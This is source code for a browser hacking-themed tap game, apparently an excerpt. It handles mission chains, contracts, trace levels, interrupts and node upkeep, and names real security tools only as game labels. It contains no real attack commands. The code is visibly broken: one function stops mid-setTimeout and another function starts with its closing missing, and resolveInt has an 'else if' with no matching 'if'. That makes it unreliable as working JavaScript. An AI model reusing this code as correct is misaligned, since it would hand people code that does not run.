  // Bonus reward on top of per-tool earnings
  const baseBonus=chain.steps.reduce((acc,s)=>{
    const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===s.toolId);
    return acc+(t?t.reward.base:0);
  },0);
  const bonus=Math.floor(baseBonus*(chain.bonusMultiplier-1)*G.rep*(1+G.missionsCompleted*0.02));
  G.credits+=bonus;
  G.totalCreditsEarned=(G.totalCreditsEarned||0)+bonus;
  G.missionChainsCompleted=(G.missionChainsCompleted||0)+1;
  // Mark node as owned
  if(G.networkNodes[chain.nodeId])G.networkNodes[chain.nodeId].status='owned';
  logSep();
  log(`> ✓ MISSION COMPLETE: ${chain.name}`,'ok');
  log(`> Completion bonus: +$${fmtNum(bonus)}`,'ok');
  log(`> Node ${chain.nodeName} is now under your control.`,'info');
  logSep();
  showFloat(bonus);
  playPrestige();
  G.activeMissionChain=null;
  save();
  if(curPanel==='missions')renderPanel('missions');
}

function burnMissionChain(){
  if(!G.activeMissionChain)return;
  const chain=G.activeMissionChain;
  // Cooldown the node
  G.nodeCooldowns[chain.nodeId]=Date.now()+10*60*1000; // 10 min cooldown
  log(`> ✗ MISSION FAILED: ${chain.name}`,'err');
  log(`> Node ${chain.nodeName} on lockdown for 10 minutes.`,'warn');
  G.activeMissionChain=null;
  save();
  if(curPanel==='missions')renderPanel('missions');
}

// CONTRACTS BOARD

function generateContracts(){
  const allT=[...MT,...(G.faction?FACTION_MT[G.faction]:[])];
  // Only tools where BOTH op count AND credit requirements are met
  const available=allT.filter(t=>{
    const[minM,minC]=t.unlockAt;
    return G.missionsCompleted>=minM&&G.credits>=minC;
  });
  if(!available.length)return;
  const picks=[];
  const shuffled=[...available].sort(()=>Math.random()-0.5);
  for(let i=0;i<Math.min(3,shuffled.length);i++){
    const t=shuffled[i];
    const flavors=CONTRACT_FLAVORS[t.id];
    const flavor=flavors?flavors[rnd(0,flavors.length-1)]:'Anonymous contract. Standard terms.';
    const scale=1+G.missionsCompleted*0.04;
    const reward=Math.floor(t.reward.base*0.25*G.rep*scale);
    picks.push({
      id:'ct_'+randHash(),
      toolId:t.id,
      toolName:t.name,
      flavor,
      reward,
      expiresAt:Date.now()+15*60*1000,
    });
  }
  G.contracts=picks;
  G.contractsLastRefresh=Date.now();
  save();
}

function acceptContract(contractId){
  if(G.missionRunning){log('> Finish current tool first.','warn');return;}
  const contract=G.contracts.find(c=>c.id===contractId);
  if(!contract){log('> Contract no longer available.','warn');return;}
  if(Date.now()>contract.expiresAt){
    log('> Contract expired.','warn');
    G.contracts=G.contracts.filter(c=>c.id!==contractId);
    renderPanel('missions');return;
  }
  G.activeContractId=contractId;
  log(`> CONTRACT ACCEPTED: ${contract.toolName}`,'ok');
  log(`> ${contract.flavor}`,'dim');
  log(`> Bonus on completion: +$${fmtNum(contract.reward)}`,'info');
  selectMission(contract.toolId);
  showPanel('none');
}

function onContractToolComplete(toolId){
  if(!G.activeContractId)return;
  const contract=G.contracts.find(c=>c.id===G.activeContractId);
  if(!contract||contract.toolId!==toolId)return;
  const bonus=Math.floor(contract.reward*G.rep);
  G.credits+=bonus;
  G.totalCreditsEarned=(G.totalCreditsEarned||0)+bonus;
  log(`> CONTRACT COMPLETE — +$${fmtNum(bonus)} bonus`,'ok');
  showFloat(bonus);

  // Special handling for sector recon contracts
  if(contract.sectorRecon){
    const sectorId=contract.sectorRecon;
    const intro=SECTOR_RECON_INTROS[sectorId];
    // Reveal the sector's entry node directly
    const entryNodeId=contract.sectorReconEntry;
    if(entryNodeId&&G.networkNodes[entryNodeId]){
      G.networkNodes[entryNodeId].status='scanned';
      log(`> ENTRY POINT REVEALED: ${G.networkNodes[entryNodeId].name}`,'ok');
      log(`> Switch to ${SECTORS[sectorId]?.name||'new sector'} in OPS to see missions.`,'info');
    }
    // Fire the narrative message from the intro
    if(intro?.msg){
      setTimeout(()=>{
        logSep('msg');

function getIntChance(){
  // Base chance from global trace level
  let b=0.12+(G.trace/100)*0.20;
  // Node heat adds on top — hitting the same target repeatedly is riskier
  if(G.activeMissionChain){
    const nh=(G.networkNodes[G.activeMissionChain.nodeId]?.nodeHeat||0);
    b+=nh/100*0.20;
  }
  // Network upgrades reduce interrupt chance
  if(isUpgradeActive('lat1'))b*=.8;
  if(isUpgradeActive('lat2'))b*=.6;
  if(isUpgradeActive('lat3'))b*=.3;
  return Math.min(b,.55);
}

function tryInterrupt(){
  if(intState.active||G.phase!=='process')return;
  if(Math.random()>getIntChance())return;
  const valid=INTERRUPTS.filter(i=>i.cond());
  if(!valid.length)return;
  fireInterrupt(valid[rnd(0,valid.length-1)]);
}

function resolveInt(outcome,choice){
  clearInterval(intTimerInt);
  document.getElementById('int-ov').classList.remove('on');
  intState.active=false;
  const int=intState.intObj;
  G.interruptFails=G.interruptFails||0;
  let resume=true;
  if(outcome==='tap_ok'){log(`> ✓ EVADED: ${int.successMsg}`,'ok');}
  else if(outcome==='tap_fail'){
    G.interruptFails++;log(`> ✗ FAILED: ${int.failMsg}`,'warn');

    else if(G.interruptFails===2){addTrace(int.heatOnFail||20);log(`> LOCKOUT: heat decay suspended 30s`,'err');}
    else{log(`> REWARD CUT 50%`,'err');intState.rewardHalved=true;}
    if(int.id==='auth'){resume=false;abortMission();}
  }else if(outcome==='abort'){log(`> ${choice.msg}`,'warn');resume=false;abortMission();}
  else if(outcome==='continue'){log(`> ${choice.msg}`,'warn');addTrace(18);}
  else if(outcome==='spoof'){log(`> ${choice.msg}`,'dim');addTrace(6);intState.rewardHalved=true;}
  else if(outcome==='throttle'){log(`> ${choice.msg}`,'dim');}
  else if(outcome==='reroute'){log(`> ${choice.msg}`,'warn');addTrace(10);}
  else if(outcome==='race_win'){log(`> ✓ Target locked. Rival blocked.`,'ok');}
  else if(outcome==='race_lose'){G.interruptFails++;log(`> Rival partial access. Reward halved.`,'warn');intState.rewardHalved=true;}
  intState.processPaused=false;
  if(resume&&G.missionRunning&&G.phase==='process'){
    const m=MISSIONS.find(m=>m.id===G.activeMission)||FACTION_MISSIONS.find(m=>m.id===G.activeMission);
    const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===G.activeMission);
    if(m&&t)resumeProc(m,t,outcome==='throttle'?2:1);
  }
  updateUI();
}

function getProcSecs(t){
  const b=t.pBase,d=t.driver;
  if(d==='latency')          return Math.max(3,b/(200/Math.max(G.latency,5)));
  if(d==='cpu')              return Math.max(3,b/(G.cpu/256));
  if(d==='bandwidth')        return Math.max(3,b/(G.bandwidth/56));
  if(d==='cpu+ram')          return Math.max(3,b/((G.cpu/256)*.6+(G.ram/512)*.4));
  if(d==='bandwidth+latency')return Math.max(3,b/((G.bandwidth/56+200/Math.max(G.latency,5))/2));
  return b;
}

function getBWT(){if(G.bandwidth>=1000000)return 5;if(G.bandwidth>=100000)return 4;if(G.bandwidth>=10000)return 3;if(G.bandwidth>=1000)return 2;return 1;}
function nextPos(st){
  const{command:c,typed:t}=st; if(t>=c.length)return c.length;
  const tier=G.typingTier;
  if(tier>=2)return c.length;
  if(tier===1){
    // Tab Complete: one tap = one meaningful shell token segment.
    // Boundaries (in priority order):
    //   1. Quoted string "..." — entire quote is one token
    //   2. Space — word boundary
    //   3. = sign — split --flag= | value separately
    //   4. / — split path segments: /usr | /share | /file
    // Short single-dash flags (-x, -l ≤4 chars) group with next plain token.
    const remaining=c.slice(t);
    if(!remaining)return c.length;
    const ch=remaining[0];

    // Quoted string — advance to end of closing quote (whole thing = one tap)
    if(ch==='"'||ch==="'"){
      const closeIdx=remaining.indexOf(ch,1);
      if(closeIdx===-1)return c.length; // unclosed quote — eat to end
      const afterClose=remaining.slice(closeIdx+1);
      const spAfter=afterClose.indexOf(' ');
      // Advance past quote and any trailing non-space chars (e.g. closing paren)
      return spAfter===-1?c.length:t+closeIdx+1+spAfter+1;
    }

    // Path segment starting with /
    if(ch==='/'){
      const nextSlash=remaining.indexOf('/',1);
      const nextSpace=remaining.indexOf(' ');
      if(nextSlash===-1&&nextSpace===-1)return c.length;
      if(nextSlash===-1)return t+nextSpace+1;
      if(nextSpace===-1)return t+nextSlash;
      return t+Math.min(nextSlash,nextSpace);
    }

    // Find the space-delimited token
    const spaceIdx=remaining.indexOf(' ');
    const rawToken=spaceIdx===-1?remaining:remaining.slice(0,spaceIdx);

    // Split --flag=value at the = so value is next tap
    const eqIdx=rawToken.indexOf('=');
    if(eqIdx!==-1&&eqIdx<rawToken.length-1){
      return t+eqIdx+1;
    }

    // Short single-dash flag (-x, -sV ≤4 chars) — group with next token
    // unless next token is a path, long flag, or quoted string
    if(rawToken.length<=4&&rawToken.startsWith('-')&&!rawToken.startsWith('--')&&spaceIdx!==-1){
      const after=remaining.slice(spaceIdx+1);
      if(!after.startsWith('/')&&!after.startsWith('--')&&after[0]!=='"'&&after[0]!=="'"){
        const sp2=after.indexOf(' ');
        return sp2===-1?c.length:t+spaceIdx+1+sp2+1;
      }
    }

    // Normal token — advance past the space
    return spaceIdx===-1?c.length:t+spaceIdx+1;
  }
  return Math.min(t+[0,1,2,3,4,6][Math.min(getBWT(),5)],c.length);
}
function renderCmd(){document.getElementById('cmdtxt').textContent=TS.command.slice(0,TS.typed);}
function renderPS(){document.getElementById('prestage-typed').textContent=PS.command.slice(0,PS.typed);document.getElementById('prestage-rest').textContent=PS.command.slice(PS.typed);}

// ═══════════════════════════════════════════════
// PHASE 1: TYPE
// ═══════════════════════════════════════════════
function startTypePhase(mission){
  G.phase='type'; G.interruptFails=0;
  TS.command=mission.command; TS.typed=0; renderCmd();
  el('phlbl').textContent='// PHASE 1: EXECUTE COMMAND'; el('phlbl').className='phlbl on';
  el('countdown').className='countdown'; el('progwrap').classList.add('on');
  el('proglbl').textContent='TYPING'; el('progfill').className=''; el('progpct').style.color='#00ff41';
  el('prestage').className='prestage'; updatePct(0); updateTapBtn();
}

function tapType(){
  if(G.phase!=='type'||!G.missionRunning)return false;
  const allMissions=[...MISSIONS,...FACTION_MISSIONS];
  const m=allMissions.find(m=>m.id===G.activeMission);
  if(!m||TS.typed>=TS.command.length)return false;
  const prev=TS.typed; TS.typed=nextPos(TS); renderCmd(); playKey();
  if(prev===0) onTutFirstTap();
  addTrace((m.hPC||.04)*(TS.typed-prev)*(m._intelBonus?.7:1));
  const pct=Math.min(100,(TS.typed/TS.command.length)*100);
  G.missionProgress=pct; updatePct(pct);
  if(TS.typed>=TS.command.length){setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},350);}
  return true;
}

// ═══════════════════════════════════════════════
// PHASE 2: PROCESS
// ═══════════════════════════════════════════════
function startProcPhase(mission){
  G.phase='process'; G.missionProgress=0;
  onTutPhase2Start();
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===mission.id);
  const secs=getProcSecs(template)*(mission._intelBonus&&template.id==='scp_exfil'?.7:1);
  el('phlbl').textContent=`// PHASE 2: ${dLbl(template.driver)}`; el('phlbl').className='phlbl on proc';
  el('proglbl').textContent=dTag(template.driver); el('progfill').className='proc'; el('progpct').style.color='#cc44ff';
  updatePct(0); updateTapBtn(); startCdown(Math.ceil(secs));
  startAmbient(template.driver);
  log(`> Processing... [${dLbl(template.driver)}] ~${Math.ceil(secs)}s`,'proc');
  // Use sector-specific flavor if available
  const sectorFlavor=template.flavorByS&&template.flavorByS[G.currentSector];
  const fl=[...(sectorFlavor||template.flavor||[])];
  fl.forEach((line,i)=>{
    setTimeout(()=>{
      if(G.phase!=='process'||G.activeMission!==mission.id)return;
      const cooked=line.replace('{port}',mission._port||randPort()).replace('{user}',mission._user||randUser()).replace('{hash}',randHash()).replace('{n}',rnd(100,9999)).replace('{ip}',mission._ip||randIP()).replace('{pct}',Math.floor((i/fl.length)*100)+'%').replace('{size}',fmtFS(mission._fs||1024));
      log('  '+cooked,'dim');
    },(secs*1000/fl.length)*i+300);
  });
  startProcInt(secs,1);
  setupPrestage();
  setTimeout(()=>tryInterrupt(),rnd(Math.floor(secs*300),Math.floor(secs*700)));
}

function startProcInt(secs,mult){
  clearInterval(procInt);
  const tickMs=150,totalTicks=(secs*1000)/(tickMs*mult); let ticks=0;
  const allT2=[...MT,...Object.values(FACTION_MT).flat()];
  const tmpl2=allT2.find(t=>t.id===G.activeMission);
  procInt=setInterval(()=>{
    if(intState.processPaused)return;
    ticks++; const pct=Math.min(100,(ticks/totalTicks)*100);
    G.missionProgress=pct; updatePct(pct);
    // Heat during processing (30% of typing rate)
    if(tmpl2) addTrace((tmpl2.hPC||.05)*0.5*(tickMs/1000));
    if(pct>=100){clearInterval(procInt);clearInterval(cdownInt);stopAmbient();completeMission();}
  },tickMs);
}

function resumeProc(mission,template,slow=1){
  const rem=(1-G.missionProgress/100);
  const secs=getProcSecs(template)*rem*slow;
  startProcInt(secs,1); startCdown(Math.ceil(secs));
}

function startCdown(secs){
  clearInterval(cdownInt); let t=secs;
  const e=el('countdown'); e.className='countdown on'; e.textContent=`[ ${t}s ]`;
  cdownInt=setInterval(()=>{t--;if(t<=0){clearInterval(cdownInt);e.className='countdown';}else e.textContent=`[ ${t}s ]`;},1000);
}

function setupPrestage(){
  if(G.missionQueue.length===0){el('prestage').className='prestage';return;}
  const nid=G.missionQueue[0];
  const nt=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===nid);
  if(!nt)return;
  const nm=genMission(nt);
  const idx=MISSIONS.findIndex(m=>m.id===nid);
  if(idx>=0)MISSIONS[idx]=nm;
  PS.command=nm.command; PS.typed=0; renderPS();
  el('prestage-lbl').textContent='// STAGING: '+nt.name;
  el('prestage').className='prestage on';
  if(G.typingTier>=3){
    const aps=setInterval(()=>{if(G.phase!=='process'){clearInterval(aps);return;}if(PS.typed>=PS.command.length){clearInterval(aps);return;}PS.typed=Math.min(PS.typed+3,PS.command.length);renderPS();},200);
  }
}

function tapPS(){
  if(G.phase!=='process'||PS.typed>=PS.command.length)return false;
  PS.typed=nextPos(PS); renderPS(); playKey(); return true;
}

// ═══════════════════════════════════════════════
// COMPLETE / ABORT
// ═══════════════════════════════════════════════
function completeMission(){
  if(!G.missionRunning)return;
  const allM=[...MISSIONS,...FACTION_MISSIONS];
  const mission=allM.find(m=>m.id===G.activeMission);
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===G.activeMission);
  if(!mission||!template)return;

  // Intel drop from recon
  if(template.drops==='intel'){
    G.knownTargets[mission.id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};
    ['hydra_ssh','scp_exfil','metasploit','ssh_backdoor','worm_deploy'].forEach(id=>{if(!G.knownTargets[id])G.knownTargets[id]={ip:mission._ip,sn:mission._sn,port:mission._port,user:mission._user,corp:mission._corp};});
    log(`> INTEL: ${mission._corp} (${mission._ip}) mapped. Follow-ups get bonuses.`,'info');
    // Sector-aware node reveal — reveals one unknown node in current sector
    onReconComplete();
  }

  // Mark node as scanned/owned on map
  if(template.reward.passive){
    const nodeKey=mission.id==='worm_deploy'?'cipher_node':mission.id==='ssh_backdoor'?'corp_db':'market';
    if(G.networkNodes[nodeKey])G.networkNodes[nodeKey].status='owned';
    log(`> NODE OWNED: passive income active`,'ok');
  }

  // Economy v2: small direct reward + loot listed on darkweb market
  const base=template.reward.base;
  const scale=1+G.missionsCompleted*.05;
  const factionBonus=G.faction?1.15:1;
  const penMult=intState.rewardHalved?.5:1;
  // Black market rep boost applies to direct earnings too
  const bmRepMult=(G._repBoostUntil&&Date.now()<G._repBoostUntil)?2:1;
  // 20% paid direct, 80% goes to market as loot
  const directEarned=Math.floor(base*0.2*G.rep*scale*factionBonus*penMult*bmRepMult);
  G.credits+=directEarned; G.totalCreditsEarned=(G.totalCreditsEarned||0)+directEarned;
  G.missionsCompleted++;
  // Consume one burner proxy charge
  if(G.burnerProxyCharges&&G.burnerProxyCharges>0){
    G.burnerProxyCharges--;
    if(G.burnerProxyCharges===0)log('> Burner proxy expired.','dim');
  }
  onMissionCompletedInSector(G.activeMission);
  checkNarrative();

  // Generate loot for market — pass nodeId so heat penalty applies
  const activeNodeId=G.activeMissionChain?.nodeId||null;
  const loot=generateLoot(G.activeMission, mission._corp, activeNodeId);
  const lootVal=loot?loot.qty*loot.valueEach:0;
  const lootStr=loot?` | ${fmtNum(loot.qty)} ${loot.label} → MARKET`:'';

  onTutPhase2Done();
  log(`> ✓ ${mission.name} — $${fmtNum(directEarned)} cash${lootStr}`+(intState.rewardHalved?' [PENALTY]':''),'ok');
  if(loot){
    const stacked=G.lootInventory.find(l=>l.type===LOOT_TABLE[G.activeMission]?.type);
    const stackNote=stacked&&stacked.qty>loot.qty?` (stacked — total: ${fmtNum(stacked.qty)} units)`:'';
    log(`> MARKET: $${fmtNum(lootVal)} of ${loot.label} listed at $${loot.valueEach.toFixed(2)}/unit${stackNote}`,'dim');
  }
  if(template.reward.passive)log(`> PASSIVE NODE: income dripping`,'ok');
  playOK(); showFloat(directEarned); addTrace(template.hOC||5);

  const completedToolId=G.activeMission;
  G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
  TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
  clearInterval(procInt); clearInterval(cdownInt); stopAmbient();
  el('cmdtxt').textContent='';
  el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
  el('countdown').className='countdown'; el('prestage').className='prestage';

  // Notify mission chain and contract system
  onMissionToolComplete(completedToolId, loot);
  onContractToolComplete(completedToolId);

  const btn=el('tapbtn'); btn.classList.add('locked'); tapCD=true;
  setTimeout(()=>{
    btn.classList.remove('locked'); tapCD=false; updateUI();
    // Only auto-advance queue if no mission chain is taking over
    if(!G.activeMissionChain){
      if(G.missionQueue.length>0){const nid=G.missionQueue.shift();updateQdisp();selectMission(nid,true);}
      else updateTapBtn();
    }
  },700);
  updateUI();
}

function abortMission(){
  // Clear any running tool state
  clearInterval(procInt); clearInterval(cdownInt); clearInterval(intTimerInt); stopAmbient();
  el('int-ov').classList.remove('on'); intState.active=false; intState.processPaused=false;

  if(G.activeMission||G.missionRunning){
    log('> TOOL ABORTED','warn');
    G.missionRunning=false; G.phase=null; G.activeMission=null; G.missionProgress=0;
    TS.command=''; TS.typed=0; PS.command=''; PS.typed=0;
    el('cmdtxt').textContent='';
    el('progwrap').classList.remove('on'); el('phlbl').className='phlbl';
    el('countdown').className='countdown'; el('prestage').className='prestage';
  }

  // Burn mission chain if active (covers both mid-tool and between-step)
  if(G.activeMissionChain)burnMissionChain();
  if(G.activeContractId){G.activeContractId=null;}
  updateTapBtn(); updateUI();
}

// ═══════════════════════════════════════════════
// SELECT / QUEUE
// ═══════════════════════════════════════════════
function selectMission(id,usePS=false,bypassCredits=false){
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const template=allT.find(t=>t.id===id); if(!template)return;
  const[minM,minC]=template.unlockAt;
  // Credit check can be bypassed for mission chain steps — player already committed
  if(G.missionsCompleted<minM){
    log(`> Tool locked: need ${minM} ops.`,'warn');
    if(G.activeMissionChain)burnMissionChain();
    return;
  }
  if(!bypassCredits&&G.credits<minC){
    log(`> Tool locked: need $${fmtNum(minC)}.`,'warn');
    return;
  }
  if(G.missionRunning){
    const slots=G.maxQueueSize-1;
    if(G.missionQueue.length>=slots){log(`> Queue full`,'warn');return;}
    if(G.missionQueue.includes(id)){log(`> Already queued`,'dim');return;}
    G.missionQueue.push(id); updateQdisp();
    log(`> QUEUED: ${template.name}`,'info');
    renderPanel('missions'); return;
  }
  let mission;
  const allM=[...MISSIONS,...FACTION_MISSIONS];
  const existing=allM.find(m=>m.id===id);
  if(usePS&&PS.command&&existing?.command===PS.command){mission=existing;}
  else{
    mission=genMission(template);
    const idx=MISSIONS.findIndex(m=>m.id===id);
    if(idx>=0)MISSIONS[idx]=mission;
    else{const fi=FACTION_MISSIONS.findIndex(m=>m.id===id);if(fi>=0)FACTION_MISSIONS[fi]=mission;}
  }
  G.activeMission=id; G.missionRunning=true;
  onTutMissionSelected();
  logSep();
  log(`> RUNNING TOOL: ${mission.name}`,'info');
  log(`> TARGET: ${mission._corp} (${mission._ip})`,'dim');
  log(`> CMD: ${mission.command}`,'dim');
  if(mission._intelBonus)log(`> INTEL ACTIVE: reduced trace + faster process`,'info');
  log(`> Est. process: ~${Math.ceil(getProcSecs(template))}s [${dLbl(template.driver)}]`,'dim');
  logSep();
  showPanel('none'); playModem();
  if(usePS&&PS.typed>0&&PS.command===mission.command){
    TS.command=mission.command; TS.typed=PS.typed; PS.command=''; PS.typed=0;
    G.phase='type';
    el('phlbl').textContent='// PHASE 1: EXECUTE COMMAND'; el('phlbl').className='phlbl on';
    el('progwrap').classList.add('on'); el('proglbl').textContent='TYPING'; el('progfill').className=''; el('progpct').style.color='#00ff41';
    el('prestage').className='prestage'; renderCmd();
    const pct=(TS.typed/TS.command.length)*100; updatePct(pct);
    if(TS.typed>=TS.command.length)setTimeout(()=>startProcPhase(mission),350);
    else updateTapBtn();
  }else startTypePhase(mission);
}

function autoStartBest(){
  const allT=[...MT,...(G.faction?FACTION_MT[G.faction]:[])];
  const sectorPool=getSectorMissions(G.currentSector);
  // Pick from current sector only; fall back to any unlocked if sector has none ready
  let av=allT.filter(t=>{
    const[m,c]=t.unlockAt;
    return sectorPool.includes(t.id)&&G.missionsCompleted>=m&&G.credits>=c;
  });
  if(!av.length){
    av=allT.filter(t=>{const[m,c]=t.unlockAt;return G.missionsCompleted>=m&&G.credits>=c;});
  }
  if(av.length)selectMission(av[av.length-1].id);
}

function updateQdisp(){
  const e=el('qind'),d=el('qdisplay');
  if(G.missionQueue.length===0){e.classList.remove('on');return;}
  e.classList.add('on');
  d.textContent=G.missionQueue.map(id=>{const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===id);return t?t.name.split(':')[0].trim():id;}).join(' → ');
}

// ═══════════════════════════════════════════════
// TAP — all button interaction routed through handleTap()
// updateTapBtn only changes label/style, never sets btn.onclick
// (setting btn.onclick=null blocks the HTML onclick attr on mobile Safari)
// ═══════════════════════════════════════════════
function handleTap(){
  if(tapCD||intState.active)return;

  // Not running: navigate or continue chain
  if(!G.missionRunning){
    if(G.activeMissionChain&&G.typingTier<3){
      // Manual CONTINUE between chain steps
      const step=G.activeMissionChain.steps[G.activeMissionChain.currentStep];
      if(step){step.status='pending';advanceMissionChain();}
    } else {
      // Open OPS to select a mission
      showPanel('missions');
    }
    return;
  }

  if(G.phase==='process'){if(tapPS())return;return;}
  if(!G.activeMission)return;
  if(G.trace>=100){log('> TRACE DETECTED — lay low','err');playFail();return;}
  tapType(); tapCD=true; setTimeout(()=>tapCD=false,40);
}

function updateTapBtn(){
  const btn=el('tapbtn');
  // Only update text and className — never touch btn.onclick.
  // The HTML onclick="handleTap()" attribute must stay intact for mobile.
  if(G.typingTier>=3&&G.activeMissionChain&&!G.missionRunning){
    btn.textContent='[ CRON: ADVANCING... ]';btn.className='idle';return;
  }
  if(!G.missionRunning){
    if(G.activeMissionChain){
      btn.textContent=G.typingTier>=3?'[ CRON WILL CONTINUE ]':'[ CONTINUE MISSION ]';
      btn.className='';
    } else {
      btn.textContent=G.typingTier>=3?'[ CRON READY — OPEN OPS ]':'[ SELECT TOOL ]';
      btn.className='none';
    }
    return;
  }
  if(G.phase==='process'){
    const allT=[...MT,...Object.values(FACTION_MT).flat()];
    const t=allT.find(t=>t.id===G.activeMission);
    const hasPS=G.missionQueue.length>0&&PS.typed<PS.command.length;
    btn.textContent=hasPS?'[ TAP TO PRE-STAGE ]':`[ ${dTag(t?.driver||'cpu')} PROCESSING... ]`;
    btn.className=hasPS?'':'proc'; return;
  }
  if(G.typingTier>=3){btn.textContent='[ AUTO-EXECUTING ]';btn.className='idle';return;}
  if(G.typingTier===2){btn.textContent='[ TAP TO RUN COMMAND ]';btn.className='';return;}
  btn.textContent=G.typingTier===1?'[ TAP TO AUTOCOMPLETE ]':'[ TAP TO TYPE ]';
  btn.className='';
}
// ═══════════════════════════════════════════════
// AUTO TICK — Cron Scheduler
// Does two things:
//   1. Auto-types through the current tool's command (type phase)
//   2. Auto-continues to the next mission chain step when between steps
// Does NOT pick or start missions — that's always the player's choice.
// ═══════════════════════════════════════════════
function startAutoTick(){
  if(autoInt)return;
  log('> CRON SCHEDULER ONLINE — auto-executing active mission steps','info');
  autoInt=setInterval(()=>{
    // Between chain steps: auto-advance after a short pause
    if(G.activeMissionChain&&!G.missionRunning){
      const chain=G.activeMissionChain;
      const step=chain.steps[chain.currentStep];
      if(step&&(step.status==='pending')){
        // Reset active→pending already done by boot restore; just advance
        step.status='active'; // mark it so we don't re-fire
        setTimeout(()=>{
          if(G.activeMissionChain&&!G.missionRunning){
            const s=G.activeMissionChain.steps[G.activeMissionChain.currentStep];
            if(s&&s.status==='active'){
              s.status='pending'; // reset so advanceMissionChain sets it properly
              advanceMissionChain();
            }
          }
        },1200); // 1.2s pause between steps
      }
      return;
    }
    // Auto-type through the current tool's command
    if(!G.missionRunning||G.phase!=='type'||G.trace>=100)return;
    const total=TS.command.length; if(!total)return;
    const allM=[...MISSIONS,...FACTION_MISSIONS];
    const m=allM.find(m=>m.id===G.activeMission); if(!m)return;
    const adv=Math.max(2,Math.floor(getBWT()*1.5));
    TS.typed=Math.min(TS.typed+adv,total); renderCmd();
    const pct=Math.min(100,(TS.typed/total)*100); G.missionProgress=pct; updatePct(pct);
    addTrace((m.hPC||.04)*adv);
    if(TS.typed>=total)setTimeout(()=>{if(G.missionRunning&&G.phase==='type')startProcPhase(m);},300);
  },350);
}

// ═══════════════════════════════════════════════
// TRACE — global authority threat level
// ═══════════════════════════════════════════════
function getTraceMultiplier(){
  let m=1;
  if(isUpgradeActive('lat1'))m*=.75;
  if(isUpgradeActive('lat2'))m*=.5;
  if(isUpgradeActive('lat3'))m*=.25;
  // Black market: burner proxy (per-op charge)
  if(G.burnerProxyCharges&&G.burnerProxyCharges>0)m*=0.2;
  return m;
}
function addTrace(amt){
  const prev=G.trace;
  G.trace=Math.min(100,G.trace+amt*getTraceMultiplier()); updateTraceBar();
  if(prev<50&&G.trace>=50||prev<75&&G.trace>=75){
    const trk=el('htrk'); trk.classList.remove('pulse');
    void trk.offsetWidth; trk.classList.add('pulse');
    setTimeout(()=>trk.classList.remove('pulse'),400);
  }
  if(G.trace>=100)triggerTraceBurn();
}
function updateTraceBar(){
  const p=G.trace,f=el('hfill');
  f.style.width=p+'%'; el('hpct').textContent=Math.floor(p)+'%';
  f.style.background=p>=70?'#ff2d2d':p>=40?'#ffb700':'#00ff41';
}
// Trace decay — slows as it approaches the floor.
// Floor = exposure level: having owned nodes, recent ops, and being unprotected keeps you exposed.
// Only active countermeasures (VPN/Tor, scrubbing) can reduce the floor itself.
function getTraceFloor(){
  let floor=0;
  const ownedCount=Object.values(G.networkNodes||{}).filter(n=>n.status==='owned').length;
  floor+=ownedCount*3;                              // each owned node = 3% base exposure
  if(G.missionsCompleted>0)floor+=Math.min(10,G.missionsCompleted*0.5); // reputation as a known actor
  if(!isUpgradeActive('lat1'))floor+=5;             // no VPN = you're more visible
  floor*=getTraceMultiplier();                      // network upgrades reduce floor too
  return Math.min(floor,35);                        // cap floor at 35%
}

setInterval(()=>{
  const floor=getTraceFloor();
  if(G.trace<=floor||intState.active)return;
  const dm=isUpgradeActive('dec1')&&!G.missionRunning?2:1;
  // Decay slows as it approaches the floor — never goes below it
  const decayAmt=Math.max(0.05,(G.trace-floor)*0.008)*dm;
  G.trace=Math.max(floor,G.trace-decayAmt);
  updateTraceBar();
},500);

// Trace scrubbing — pay to immediately reduce trace and lower the floor temporarily
function scrubTrace(){
  const floor=getTraceFloor();
  const current=Math.max(G.trace,floor);
  const reduction=Math.min(current-floor,40); // can scrub up to 40% above the floor
  if(reduction<=0){log('> Trace already at minimum exposure level.','dim');return;}
  const cost=Math.floor(reduction*80*(1+G.missionsCompleted*0.01)); // scales with progress
  if(G.credits<cost){log(`> Need $${fmtNum(cost)} to scrub ${Math.round(reduction)}% trace.`,'warn');playFail();return;}
  G.credits-=cost;
  G.trace=Math.max(floor,G.trace-reduction);
  log(`> TRACE SCRUBBED: -${Math.round(reduction)}% — $${fmtNum(cost)} paid to cover contacts`,'ok');
  playOK(); updateUI(); updateTraceBar();
  if(curPanel==='system')renderPanel('system');
}

// Node upkeep — small passive drain per owned node every minute
// Creates a reason to spend credits on maintaining territory
setInterval(()=>{
  const ownedNodes=Object.values(G.networkNodes||{}).filter(n=>n.status==='owned');
  if(ownedNodes.length===0)return;
  const upkeepPerNode=2; // $2/min per owned node
  const total=ownedNodes.length*upkeepPerNode;
  if(G.credits>=total){
    G.credits-=total;
    updateUI();
  } else {
    // Can't pay upkeep — lose the most recently acquired random node
    const randOwned=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned'&&v.random);
    if(randOwned.length>0){
      const[lostKey,lostNode]=randOwned[rnd(0,randOwned.length-1)];
      G.networkNodes[lostKey].status='scanned';
      log(`> ⚠ UPKEEP FAILURE: ${lostNode.name} — lost control (insufficient funds)`,'warn');
      G.msgUnread=true; el('msg-badge').style.display='inline';
    }
  }
},60000);
function isUpgradeActive(id){
  const u=UPG.find(u=>u.id===id); if(!u)return false;
  if(!u.toggle)return (G.upgrades[id]||0)>=1; // non-toggleable = always active when bought
  // Toggleable: default to ON when purchased
  return G.activeUpgrades?.[id]!==false&&(G.upgrades[id]||0)>=1;
}

function toggleUpg(id){
  const u=UPG.find(u=>u.id===id); if(!u||!u.toggle)return;
  if(!(G.upgrades[id]>=1)){log('> Not yet purchased.','warn');return;}
  if(!G.activeUpgrades)G.activeUpgrades={};
  const nowActive=isUpgradeActive(id);
  G.activeUpgrades[id]=!nowActive;
  if(!nowActive){
    u.apply(); // turning ON
